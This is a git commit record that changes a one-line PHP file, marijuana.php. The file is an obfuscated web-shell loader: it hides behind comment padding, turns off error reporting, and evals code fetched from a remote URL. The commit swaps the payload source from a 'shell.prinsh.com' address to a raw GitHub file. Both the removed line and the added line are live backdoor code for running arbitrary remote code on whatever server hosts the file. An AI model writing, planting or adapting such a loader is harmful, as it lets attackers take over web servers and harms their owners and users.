2749a841050d6e6bccedc25caa69afaed533ee33
anekerenn <gonisableng@gmail.com>
2025-06-26 22:19:11 +0700

    Update marijuana.php

--- planning/will/good/marijuana.php
+++ planning/will/good/marijuana.php
@@ -1,1 +1,1 @@
-<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://shell.prinsh.com/Nathan/marijuana.txt"))?>
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/anekerenn/pliss/refs/heads/main/planning/will/good/marijuana.txt"))?>
